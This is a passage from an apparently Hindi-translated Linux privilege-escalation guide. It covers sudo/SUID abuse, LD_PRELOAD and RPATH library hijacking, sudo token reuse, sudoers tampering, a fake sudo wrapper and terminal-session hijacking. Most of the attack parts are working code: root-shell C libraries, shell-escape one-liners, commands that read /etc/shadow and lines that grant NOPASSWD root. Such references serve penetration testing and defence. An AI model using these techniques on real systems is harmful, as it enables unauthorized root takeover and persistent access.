{{#endref}}

## **RunC** privilege escalation

यदि आप पाते हैं कि आप **`runc`** command का उपयोग कर सकते हैं तो निम्नलिखित पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत inter-Process Communication (IPC) system है जो applications को कुशलतापूर्वक interact और data share करने में सक्षम बनाता है। आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया यह विभिन्न प्रकार के application communication के लिए एक मजबूत फ्रेमवर्क प्रदान करता है।

यह सिस्टम बहुमुखी है, बुनियादी IPC का समर्थन करता है जो प्रक्रियाओं के बीच डेटा एक्सचेंज को बेहतर बनाता है, और यह enhanced UNIX domain sockets जैसा व्यवहार दिखा सकता है। इसके अलावा, यह events या signals प्रसारित करने में मदद करता है, जिससे सिस्टम के घटकों के बीच seamless integration संभव होता है। उदाहरण के लिए, Bluetooth daemon से आने वाला एक सिग्नल किसी music player को mute करने के लिए प्रेरित कर सकता है, जिससे user experience बेहतर होता है। अतिरिक्त रूप से, D-Bus एक remote object system का समर्थन करता है, जो सेवाओं के अनुरोध और applications के बीच method invocations को सरल बनाता है और पारंपरिक रूप से जटिल प्रक्रियाओं को सहज बनाता है।

D-Bus एक allow/deny model पर कार्य करता है, जो matching policy rules के संचयी प्रभाव के आधार पर संदेशों (method calls, signal emissions, आदि) की अनुमति/निषेध को प्रबंधित करता है। ये नीतियाँ bus के साथ इंटरैक्शन को निर्दिष्ट करती हैं, और इन permissions के शोषण के माध्यम से privilege escalation संभव हो सकता है।

एक उदाहरण नीति `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जो root user के लिए `fi.w1.wpa_supplicant1` को own, send और receive करने की permissions का विवरण देती है।

एक निर्दिष्ट user या group के बिना policies सर्वत्र लागू होती हैं, जबकि "default" context policies उन सभी पर लागू होती हैं जो अन्य विशिष्ट नीतियों द्वारा कवर नहीं हैं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ D-Bus communication को enumerate और exploit करने का तरीका जानें:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

यह हमेशा दिलचस्प होता है कि network को enumerate करके मशीन की स्थिति पता करें।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

हमेशा उस मशीन पर चल रही network services की जाँच करें जिनसे आप उसे access करने से पहले interact नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जाँच करें कि क्या आप sniff traffic कर सकते हैं। यदि आप कर सकते हैं, तो आप कुछ credentials हासिल कर सकते हैं।
```
timeout 1 tcpdump
```
## उपयोगकर्ता

### सामान्य Enumeration

जाँच करें कि आप **कौन** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन **login** कर सकता है और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

कुछ Linux संस्करण एक बग से प्रभावित थे जो उपयोगकर्ताओं को जिनका **UID > INT_MAX** है, उन्हें escalate privileges करने की अनुमति देता है। अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**इसे exploit करने के लिए**: **`systemd-run -t /bin/bash`**

### Groups

जाँचें कि क्या आप किसी **group के सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

जाँचें कि क्या क्लिपबोर्ड में कुछ रोचक मौजूद है (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप **पर्यावरण का कोई पासवर्ड** जानते हैं तो उस पासवर्ड का उपयोग करके **प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने** का प्रयास करें।

### Su Brute

यदि आप बहुत शोर करने की परवाह नहीं करते और `su` और `timeout` binaries कंप्यूटर पर मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके उपयोगकर्ता पर brute-force करने का प्रयास कर सकते हैं.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parameter के साथ भी उपयोगकर्ताओं पर brute-force करने की कोशिश करता है।

## Writable PATH का दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप $PATH के किसी फ़ोल्डर के अंदर **लिख सकते हैं** तो आप अधिकार बढ़ा सकते हैं by **लिखने योग्य फ़ोल्डर के अंदर backdoor बनाकर** जिसका नाम उस किसी command का हो जिसे किसी अलग user (आदर्श रूप से root) द्वारा execute किया जाएगा और जो $PATH में आपके लिखने योग्य फ़ोल्डर से पहले स्थित किसी फ़ोल्डर से **लोड नहीं किया जाता है**।

### SUDO and SUID

आपको कुछ command sudo का उपयोग करके execute करने की अनुमति मिल सकती है या उन पर suid bit सेट हो सकता है। इसे जाँचने के लिए:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित commands आपको फाइलें पढ़ने और/या लिखने या यहां तक कि किसी command को execute करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo कॉन्फ़िगरेशन किसी उपयोगकर्ता को बिना पासवर्ड जाने किसी अन्य उपयोगकर्ता के विशेषाधिकारों के साथ कोई कमांड चलाने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है, अब root directory में एक ssh key जोड़कर या `sh` कॉल करके shell पाना बहुत आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को किसी चीज़ को निष्पादित करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer पर आधारित**, **असुरक्षित** था **PYTHONPATH hijacking** के प्रति, ताकि script को root के रूप में चलाते समय किसी arbitrary python library को load किया जा सके:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep द्वारा संरक्षित → root shell

यदि sudoers `BASH_ENV` को संरक्षित करता है (उदा., `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash के non-interactive startup व्यवहार का उपयोग करके किसी अनुमत कमांड को invoke करते समय arbitrary code को root के रूप में चला सकते हैं।

- क्यों काम करता है: non-interactive shells के लिए, Bash `$BASH_ENV` का मूल्यांकन करता है और लक्ष्य स्क्रिप्ट चलाने से पहले उस फ़ाइल को source करता है। कई sudo नियम एक स्क्रिप्ट या shell wrapper चलाने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा संरक्षित है, तो आपकी फ़ाइल root privileges के साथ source की जाती है।

- आवश्यकताएँ:
- आपके पास चलाने योग्य sudo rule (कोई भी target जो `/bin/bash` को non-interactively invoke करता है, या कोई bash script)।
- `BASH_ENV` `env_keep` में मौजूद हो (जाँच के लिए `sudo -l`)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `BASH_ENV` (और `ENV`) को `env_keep` से हटाएं, `env_reset` को प्राथमिकता दें।
- sudo-allowed commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- जब preserved env vars का उपयोग हो तो sudo I/O logging और alerting पर विचार करें।

### Sudo execution bypassing paths

**Jump** अन्य फाइलें पढ़ने के लिए या **symlinks** का उपयोग करें। For example in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** (\*) का उपयोग किया जाता है, तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**निवारक उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary बिना command path के

यदि **sudo permission** किसी single command को **path निर्दिष्ट किए बिना** दिया गया है: _hacker10 ALL= (root) less_ तो आप इसे PATH variable बदलकर exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी उपयोग की जा सकती है यदि कोई **suid** बाइनरी **किसी अन्य कमांड को उसका पाथ निर्दिष्ट किए बिना execute करती है (हमेशा _**strings**_ से किसी अजीब SUID बाइनरी की सामग्री जांचें)**।

[Payload examples to execute.](payloads-to-execute.md)

### SUID बाइनरी जिसमें कमांड का पाथ निर्दिष्ट हो

यदि **suid** बाइनरी **किसी अन्य कमांड को उसका पाथ निर्दिष्ट करके execute करती है**, तो आप उस कमांड के नाम से एक **export a function** बनाने और उसे export करने की कोशिश कर सकते हैं जो suid फ़ाइल कॉल कर रही है।

उदाहरण के लिए, यदि कोई suid बाइनरी _**/usr/sbin/service apache2 start**_ को कॉल करती है, तो आपको उस फंक्शन को बनाकर और उसे export करके कोशिश करनी चाहिए:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid binary को कॉल करेंगे, यह function निष्पादित होगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग loader को यह निर्दिष्ट करने के लिए किया जाता है कि एक या अधिक shared libraries (.so files) को अन्य सभी से पहले लोड किया जाए, जिसमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को library को preloading कहा जाता है।

हालांकि, सिस्टम सुरक्षा बनाए रखने और इस फीचर के दुरुपयोग को रोकने के लिए, विशेषकर **suid/sgid** executables के साथ, सिस्टम कुछ शर्तें लागू करता है:

- उन executables के लिए जहाँ real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते, loader **LD_PRELOAD** को अनदेखा कर देता है।
- suid/sgid वाले executables के लिए, केवल standard paths में मौजूद और स्वयं suid/sgid वाले libraries ही preloaded होते हैं।

Privilege escalation तब हो सकती है जब आपके पास `sudo` के साथ commands execute करने की क्षमता हो और `sudo -l` के output में **env_keep+=LD_PRELOAD** शामिल हो। यह configuration **LD_PRELOAD** environment variable को बनाए रखता है और `sudo` के साथ commands चलाने पर भी उसे मान्यता देता है, जिससे संभवतः elevated privileges के साथ arbitrary code का execution हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
के रूप में सहेजें **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **compile it** का उपयोग करके:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाते हुए
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> समान privesc का दुरुपयोग तब किया जा सकता है अगर हमलावर **LD_LIBRARY_PATH** env variable को नियंत्रित करता है, क्योंकि वह उस पथ को नियंत्रित करता है जहाँ लाइब्रेरियाँ खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब किसी असामान्य दिखने वाले binary पर **SUID** permissions हों, तो यह जांचना अच्छा अभ्यास है कि वह ठीक से **.so** files लोड कर रहा है या नहीं। इसे निम्नलिखित command चलाकर जाँचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि मिलने पर यह exploitation की संभावना दर्शाती है।

इसे exploit करने के लिए, एक C file बनानी होगी, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह code, एक बार compiled और executed होने पर, file permissions को manipulate करके और elevated privileges के साथ एक shell execute करके privileges बढ़ाने का उद्देश्य रखता है।

ऊपर दिए गए C file को एक shared object (.so) file में compile करें with:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंततः प्रभावित SUID binary को चलाने से exploit ट्रिगर होना चाहिए, जिससे संभावित system compromise हो सकता है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो उस folder से एक library लोड कर रहा है जहाँ हम लिख सकते हैं, तो उस folder में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको निम्नलिखित जैसी त्रुटि मिलती है
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
इसका मतलब है कि आपने जो लाइब्रेरी जनरेट की है उसमें `a_function_name` नाम का एक फ़ंक्शन होना चाहिए।

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक curated सूची है जिन्हें एक attacker द्वारा local security restrictions bypass करने के लिए exploit किया जा सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) वही है लेकिन उन मामलों के लिए जहाँ आप किसी command में **केवल arguments inject** कर सकते हैं।

यह प्रोजेक्ट Unix binaries के वैध functions को इकट्ठा करता है जिन्हें restricted shells से बाहर निकलने, privileges escalate या बनाए रखने, फाइलें ट्रांसफ़र करने, bind और reverse shells spawn करने, और अन्य post-exploitation tasks को सुविधाजनक बनाने के लिए दुरुपयोग किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

अगर आप `sudo -l` तक पहुँच सकते हैं तो आप tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग कर सकते हैं यह जांचने के लिए कि यह किसी भी sudo नियम को exploit करने का तरीका ढूँढता है या नहीं।

### Sudo टोकनों का पुन: उपयोग

ऐसे मामलों में जहाँ आपके पास **sudo access** है लेकिन password नहीं है, आप privileges escalate कर सकते हैं **किसी sudo command के execution का इंतज़ार करके और फिर session token को hijack करके**।

privileges escalate करने की आवश्यकताएँ:

- आपके पास पहले से user _sampleuser_ के रूप में एक shell होना चाहिए
- _sampleuser_ ने **`sudo` का इस्तेमाल** करके पिछले **15mins** में कुछ execute किया हुआ होना चाहिए (डिफ़ॉल्ट रूप से यही sudo token की अवधि होती है जो हमें बिना password डाले `sudo` का उपयोग करने की अनुमति देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 होना चाहिए
- `gdb` उपलब्ध होना चाहिए (आप इसे upload करने में सक्षम हों)

(आप अस्थायी रूप से `ptrace_scope` को सक्षम कर सकते हैं `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` कमांड से या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` को संशोधित करके और `kernel.yama.ptrace_scope = 0` सेट करके)

यदि ये सभी आवश्यकताएँ पूरी होती हैं, **आप निम्न का उपयोग करके privileges escalate कर सकते हैं:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- पहला **exploit** (`exploit.sh`) बाइनरी `activate_sudo_token` को _/tmp_ में बनाएगा। आप इसे अपने session में **sudo token activate करने** के लिए उपयोग कर सकते हैं (आपको स्वतः root shell नहीं मिलेगा, `sudo su` करें):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root के स्वामित्व वाला और setuid सेट किया हुआ** होगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **तीसरा exploit** (`exploit_v3.sh`) **एक sudoers फ़ाइल बनाएगा** जो **sudo tokens को स्थायी बनाकर सभी उपयोगकर्ताओं को sudo उपयोग करने की अनुमति देगा**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास उस फ़ोल्डर में या फ़ोल्डर के अंदर बनाए गए किसी भी फ़ाइल पर **write permissions** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **create a sudo token for a user and PID** कर सकते हैं.\
उदाहरण के लिए, यदि आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को ओवरराइट कर सकते हैं और उस user के रूप में PID 1234 के साथ आपकी एक shell है, तो आप बिना password जाने **obtain sudo privileges** कर सकते हैं, ऐसा करके:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह निर्धारित करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फ़ाइलें **by default can only be read by user root and group root**.\
**यदि** आप इस फ़ाइल को **read** कर सकते हैं तो आप **कुछ रोचक जानकारी प्राप्त कर सकते हैं**, और यदि आप किसी भी फ़ाइल को **write** कर सकते हैं तो आप **escalate privileges** कर पाएँगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं तो आप इस अनुमति का दुरुपयोग कर सकते हैं
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन अनुमतियों का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` बाइनरी के कुछ विकल्प होते हैं, जैसे OpenBSD के लिए `doas` — इसकी कॉन्फ़िगरेशन `/etc/doas.conf` में जाँच करना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि एक **user आम तौर पर किसी machine से connect होता है और `sudo` का उपयोग करके privileges escalate करता है** और आपने उस user context में एक shell प्राप्त कर लिया है, तो आप **एक नया sudo executable बना सकते हैं** जो पहले आपके कोड को root के रूप में चलाएगा और फिर user का command चलाएगा। फिर, user context का **$PATH** संशोधित करें (उदाहरण के लिए नई path को .bash_profile में जोड़कर) ताकि जब user `sudo` चलाए तो आपका sudo executable ही execute हो।

ध्यान दें कि यदि user कोई अलग shell उपयोग करता है (bash नहीं) तो आपको नई path जोड़ने के लिए अन्य फ़ाइलें संशोधित करनी पड़ेंगी। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं।

या कुछ इस तरह चलाकर:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

फ़ाइल `/etc/ld.so.conf` यह दर्शाती है कि **लौड की गई कॉन्फ़िगरेशन फ़ाइलें कहाँ से आ रही हैं**। आम तौर पर, इस फ़ाइल में निम्न path होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फ़ाइलें पढ़ी जाएँगी। ये कॉन्फ़िगरेशन फ़ाइलें उन फ़ोल्डरों की ओर इशारा करती हैं जहाँ **लाइब्रेरीज़** को **खोजा** जाएगा। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर लाइब्रेरीज़ की खोज करेगा**।

यदि किसी कारणवश किसी उपयोगकर्ता के पास संकेत किए गए किसी भी path पर **लिखने की अनुमति** हो: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी फ़ाइल या `/etc/ld.so.conf.d/*.conf` में उल्लिखित कोई भी फ़ोल्डर, तो वह privileges escalate कर सकता है.\
निम्न पेज में देखें कि **how to exploit this misconfiguration**:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर प्रोग्राम इसे `RPATH` वेरिएबल में निर्दिष्ट इस स्थान पर उपयोग करेगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` कमांड के साथ एक दुर्भावनापूर्ण लाइब्रेरी बनाएं।
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities एक प्रक्रिया को उपलब्ध **root privileges का subset** प्रदान करती हैं। यह प्रभावी रूप से root को **छोटे और विशिष्ट यूनिट्स में विभाजित** कर देता है। इन यूनिट्स में से प्रत्येक को स्वतंत्र रूप से processes को दिया जा सकता है। इस तरह पूरे privileges का सेट कम हो जाता है, जिससे exploitation के जोखिम घटते हैं.\
नीचे दी गई पृष्ठ को पढ़ें ताकि आप **capabilities और उन्हें कैसे abuse करना है** इस बारे में और जान सकें:


{{#ref}}
linux-capabilities.md
{{#endref}}

## डायरेक्टरी अनुमतियाँ

एक डायरेक्टरी में, **bit for "execute"** का अर्थ है कि प्रभावित user फोल्डर में "**cd**" कर सकता है.\
**"read"** bit का अर्थ है कि user **list** कर सकता है **files**, और **"write"** bit का अर्थ है कि user **delete** और **create** नए **files** कर सकता है.

## ACLs

Access Control Lists (ACLs) discretionary permissions की सेकंडरी परत का प्रतिनिधित्व करते हैं, जो पारंपरिक ugo/rwx permissions को **overriding** करने में सक्षम हैं। ये permissions फाइल या डायरेक्टरी एक्सेस पर नियंत्रण बढ़ाते हैं क्योंकि वे उन specific users को अधिकार देने या अस्वीकार करने की अनुमति देते हैं जो मालिक नहीं हैं या समूह का हिस्सा नहीं हैं। इस स्तर की **granularity अधिक सटीक access management सुनिश्चित करती है**। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" को किसी फ़ाइल पर **read** और **write** permissions दें:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Open shell sessions

आप **old versions** में किसी दूसरे उपयोगकर्ता (**root**) के कुछ **shell** session को **hijack** कर सकते हैं.\
आप **newest versions** में केवल **your own user** के screen sessions से **connect** कर पाएँगे। हालांकि, आप session के अंदर **interesting information inside the session** पाकर उपयोगी जानकारी निकाल सकते हैं।

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**किसी session से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह **old tmux versions** के साथ एक समस्या थी। मैं एक non-privileged user के रूप में root द्वारा बनाए गए tmux (v2.1) session को hijack नहीं कर पाया।

**tmux sessions सूची**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**session से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
उदाहरण के लिए **Valentine box from HTB** देखें।

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
यह बग उन OS पर नया ssh key बनाते समय होता है, क्योंकि **केवल 32,768 variations ही संभव थे**। इसका मतलब है कि सभी संभावनाएँ calculate की जा सकती हैं और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**। आप calculated possibilities यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** यह निर्दिष्ट करता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह निर्दिष्ट करता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति है, तो यह बताता है कि सर्वर खाली password वाले अकाउंट्स में login की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

यह निर्दिष्ट करता है कि root ssh का उपयोग करके login कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभावित मान:

